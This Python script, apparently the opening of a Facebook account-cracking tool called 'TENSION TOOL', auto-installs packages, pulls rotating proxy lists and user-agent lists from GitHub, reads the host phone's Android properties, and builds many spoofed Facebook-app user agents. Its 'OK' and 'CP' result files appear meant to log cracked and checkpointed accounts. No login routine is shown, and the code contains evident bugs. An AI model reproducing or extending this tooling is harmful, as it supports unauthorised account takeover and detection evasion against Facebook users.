"""""""""
     CODED BY MUGHAL
"""""""""

#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from urllib.request import urlopen
    from os import path
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    time.sleep(0.5)
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
    
#<<_________[ IMPORTING MODULES ]_________>>#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import threading, itertools,shutil,webbrowser,datetime,string
import marshal
import os,base64
from os import system as clr
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO TENSION TOOL ·...')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  Installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
from string import * 
from random import randint
from time import sleep as slp
from datetime import datetime
from datetime import date
from os import system as cmd
from zlib import decompress 
from weakref import proxy
from time import localtime as lt
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=60).submit
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2
    
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
prox=open('.prox.txt','r').read().splitlines()


try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

#####____Samsung-Models____#####
model2 ="""M2101K6G
Aquaris U Plus
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V
> 
""".splitlines()

android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Roshan"
                        sim_id+=fbcr
        else:
                fbcr = 'Roahan'
                sim_id+=fbcr
except:
        fbcr = "Roahan"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def Asraf(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def asraf(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)

#<<__________UA SET-UP_____>>#
	
def UBI():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["M Bot 54", "M Bot 60", "M1", "M3", "M3s", "M5 Lite", "M6 Note", "Magic", "Maimang 5", "Mate 10 Lite Dual SIM", "Mate 20 X (China)", "Mate 8", "MB526", "Medias X", "MI 2", "MI 3W", "Mi 4 LTE", "MI 4i", "MI 5", "MI 5X", "Mi A1", "Mi Max", "Mi Max 2", "Mi Mix 2", "Milestone", "Miracle", "Moment (Sprint)", "Monza", "Motion Plus", "Moto C", "Moto E2 (4G LTE)", "Moto E3 Power", "Moto E4", "Moto E4 Plus", "Moto E5", "Moto E5 Plus", "Moto G", "Moto G 2nd Gen", "Moto G Play", "Moto G3", "Moto G3 Turbo Edition", "Moto G4", "Moto G5 Plus", "Moto G5s", "Moto G5s Plus", "Moto G6", "Moto X", "Moto X 2nd Gen (AT&T)", "Moto Z", "Multipad 2 Ultra Duo 8.0 3G", "MultiPhone 3350 Duo", "MultiPhone 4044 Duo", "MultiPhone 5504 DUO", "Multiphone 7600 Duo", "MX2", "MX380", "MX5","13 Pro","Black Shark","Black Shark 2","Black Shark 3","Black Shark 3S","Black Shark 4","Black Shark 4 Pro","Black Shark 5","Black Shark 5 Pro","Black Shark Helo","Civi","Civi 2","Hongmi","Hongmi 1S","Hongmi 2","Hongmi 2 3G","Hongmi 2 4G","Hongmi 4G","Hongmi Note 1TD","Mi Box 4","Mi Cancro","Mi CC 9","Mi CC 9 Pro","Mi CC 9e","Mi CC9","Mi Laser Projector 150","Mi Max","Mi Max 2","Mi Max 3","Mi MAX2","Mi Max3","Mi Mix","Mi Mix 2","Mi Mix 2S","Mi Mix 3","Mi Mix 3 5G","Mi Mix 4","Mi Mix Fold","Mi Note 10","Mi Note 10 Lite","Mi Note 10 Pro","Mi Note 11","Mi Note 2","Mi Note 3","Mi Note 8","Mi Note LTE","Mi Note Pro","Mi Note10","Mi Note5","Mi One","Mi One C1","Mi One Plus","Mi Pad","Mi Pad 2","Mi Pad 3","Mi Pad 4","Mi Pad 4 Plus","Mi Pad 5","Mi Pad 5 Pro","Mi Pad 5 Pro 5G","Mi Pad4","Mi Pad5","Mi Play","Mi XL","Mi5","MiTV 4A","MiTV 4A Pro","MiTV 4C","MiTV 4I","MiTV 4S","MiTV 4X","MiTV P1","MiTV Q1","MiTV Stick","MiTV Stick 4K","Mix Fold 2","MT6765 G Series","Note 12 Pro","Pad 6 Pro","Pocophone F1","Qin 1s+","Qin 2","Qin 2 Pro","Redmi 11","Redmi 12","Redmi 2","Redmi 3","Redmi 4","Redmi 5","Redmi 6","Redmi 7","Redmi 8","Redmi 9","Redmi A1","Redmi A2","Redmi A3","Redmi K30","Redmi K40","Redmi K50","Redmi K60","Redmi note","Redmi Note 1","Redmi Note 10Redmi Note 11","Redmi Note 12","Redmi Note 12T","Redmi Note 13","Redmi Note 15 Pro","Redmi Note 2","Redmi Note 3","Redmi Note 4","Redmi Note 5","Redmi Note 5 Pro","Redmi Note 6","Redmi Note 7","Redmi Note 7 Pro","Redmi Note 8 Pro","Redmi Note 8T","Redmi Note 9","Redmi Note 9 5G","Redmi Note 9 Pro","Redmi Note 9 Pro 5G","Redmi Note 9 Pro Max","Redmi Note 9S","Redmi Note 9T","Redmi Note 9T 5G","Redmi Note Prime","Redmi Note10","Redmi Note10T","Redmi Note7","Redmi Note8","Redmi Note8T","Redmi Note9","Redmi Pad","Redmi Pro","Redmi S2","Redmi X","Redmi Y1","Redmi Y1 Lite","Redmi Y2","Redmi Y3","Redmi 2", "Redmi 3", "Redmi 3S", "Redmi 4", "Redmi 4A", "Redmi 4X", "Redmi 5", "Redmi 5 Plus", "Redmi 5A", "Redmi 6", "Redmi Note", "Redmi Note 3", "Redmi Note 4", "Redmi Note 4X", "Redmi Note 5", "Redmi Note 5 Pro", "Redmi Note 5A", "Redmi Note 5A Prime", "Redmi S2", "Redmi Y1", "Redmi Y1 Lite", "Redmi Y2", "Rex 60", "Rex 80", "Rhyme", "RM-560", "Ruby","SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6.","SM-G920F","NRD90M", "SM-T535","LRX22G", "SM-T231","KOT49H", "SM-J320F","LMY47V", "GT-I9190","KOT49H", "GT-N7100","KOT49H", "SM-T561","KTU84P", "GT-N7100","KOT49H", "GT-I9500","LRX22C", "SM-J320F","LMY47V", "SM-G930F","NRD90M", "SM-J320F","LMY47V", "SM-J510FN","NMF26X", "GT-P5100","IML74K", "SM-J320F","LMY47V", "GT-N8000","JZO54K", "SM-T531","LRX22G", "SPH-L720","KOT49H", "GT-I9500","JDQ39", "SM-G935F","NRD90M", "SM-T561","KTU84P", "SM-T531","KOT49H", "SM-J320FN","LMY47V", "SM-A500F","MMB29M", "SM-A500FU","MMB29M", "SM-A500F","MMB29M", "SM-T311","KOT49H", "SM-T531","LRX22G", "SM-J320F","LMY47V", "SM-J320FN","LMY47V", "SM-J320F","LMY47V", "GT-P5210","KOT49H", "SM-T230","KOT49H", "GT-I9192","KOT49H", "SM-T235","KOT4", "GT-N7100","KOT49H", "SM-A500F","LRX22G", "SM-A500F","MMB29M", "GT-N7100","KOT49H", "SM-G920F","MMB29K", "SM-J510FN","NMF26X", "GT-N8000","JZO54K", "SM-J320FN","LMY47V", "SM-J320FN","LMY47V", "SM-A500H","MMB29M", "GT-I9300","JSS15J", "GT-I9500","LRX22C", "SM-J320F","LMY4", "SM-J510FN","NMF26X", "SM-A500F","MMB29M", "GT-N8000","KOT49H", "SM-T561","KTU84P", "SM-G900F","KOT49H", "GT-S7390","JZO54K", "SM-J320F","LMY47V", "GT-P5100","JZO54K", "SM-A500FU","MMB29M", "SM-G930F","NRD90M", "SM-J510FN","NMF26X", "SM-T561","KTU84P", "GT-N8000","KOT49H", "SM-T531","LRX22G", "SM-J510FN","MMB29M", "SM-J510FN","NMF26X", "SM-J320F","LMY47V", "GT-P5110","JDQ39", "GT-I9301I","KOT49H", "SM-A500F","LRX22G", "SM-G930F","NRD90M", "SM-T311","KOT4", "GT-P5200","KOT49H", "GT-I9301I","KOT49H", "SM-J320M","LMY47V", "SM-T531","LRX22G", "SM-T820","NRD90M", "GT-I9192","KOT49H", "SM-G935F","MMB29K", "SM-J701F","NRD90M;", "GT-I9301I","KOT4", "SM-J320FN","LMY47V", "SM-T111","JDQ39", "SM-A500F","MMB29M", "SM-J510FN","NMF2", "SM-T705","LRX22G", "SM-G920F","NRD90M", "GT-N5100","JZO54K", "GT-I9300I","KTU84P", "GT-I9300I","KTU84P", "GT-N8000","KOT49H", "GT-N8000","KOT49H", "SM-A500F","MMB29M", "GT-I9190","KOT49H", "SM-J510FN","NMF26X", "SM-J320F","LMY47V", "GT-P5100","JDQ39", "GT-I9300I","KTU84P", "GT-N5100","JZO54K", "GT-N8000","KOT49H", "GT-I9500","LRX22C", "SM-J320FN","LMY47V", "SM-A500F","MMB29M", "GT-N8000","JZO54K", "SM-T805","LRX22G", "SM-T231","KOT49H", "GT-N5100","JZO54K", "SM-J320H","LMY47V", "SM-T231","KOT49H", "SM-G930F","NRD90M", "SM-G935F","NRD90M", "SM-T310","KOT49H", "GT-N8000","KOT49H", "GT-I9300I","KTU84P", "SM-G920F","NRD90M", "SM-J510FN","NMF26X", "SM-T705","LRX22G;", "GT-P3110","JZO54K", "GT-I9192","KOT49H", "SM-J320F","LMY47V", "SM-G920F","NRD90M", "GT-I9300","IMM76D", "SM-G950F","NRD90M", "SM-J320F","LMY47V", "SM-J510FN","NMF26X;", "SM-J701F","NRD90M", "SM-A500F","LRX22G", "SM-T231","KOT49H", "SM-T311","KOT49H", "SM-J320FN","LMY47V", "GT-P5210","KOT49H", "SM-T805","LRX22G", "GT-I9500","LRX22C", "GT-P5200","KOT49H", "GT-I9301I","KOT49H", "GT-I9300","JSS15J", "GT-N7100","KOT49H", "SM-T531","LRX22G", "SM-T820","NRD90M", "SM-T315","JDQ39", "SM-J320F","LMY47V", "GT-I9190","KOT49H", "GT-P5220","JDQ39", "SM-T525","KOT49H", "SM-T555","LRX22G", "GT-I9190","KOT49H", "SM-J510FN","NMF26X;", "SM-A500F","MMB29M", "GT-I9192","KOT49H", "GT-P5100","JDQ", "SM-T311","KOT49H"])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    fbcr = random.choice(["Zong","Telenor","Jazz","Ufone","Warid","null","Marshmallow","Telekom China","Grameenphone","IND airtel","Namaste","Ncell","Smart cell","TELCEL","Fiber","Telecom","Sprint","banglalink","Verizon","AT&amp","TRUE-H","robi","Vodafone","MTN-CG","fido","MOVO AFRICA","UFONE-PAKTel","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Satcom","Docomo","Rakuten","IIJmio","Orange","AT&T","T-Mobile","Telefonica","EE","Orange","Three"])
    local = random.choice(["en_US","en_GB","en_PK","pt_BR","in_NP","np_NP","it_IT","ru_RU","en_ES","ja_JP","ex_MX","en_CU","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_AF","sv_SE","hr_HR"]) 
    ua1 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto e5 plus Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=1.7,width=720,height=1358};'+'FB_FW/1;FBRV/0;]'                                                     
    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_X00RD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto z4 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2120};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G973U Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; HUAWEI VNS-L21 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1812};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)} UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'                                 
    ua8 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; GT-I9505 Build/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/{str(application_version_code)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR//{str(fbcr)};FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+'FB_FW/1;]'                                                   
    ua9 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto e5 plus Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=1.7,width=720,height=1358};'+'FB_FW/1;FBRV/0;]'
    ua10=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; RMX8122 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBMF/RMX;FBBD/RMX;FBDV/RMX8122;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    ua11=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Redmi Note 8T MIUI/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/'+'{density=2.75,width=1080,height=2130};'+'FB_FW/1;] '+'FBBK/1'
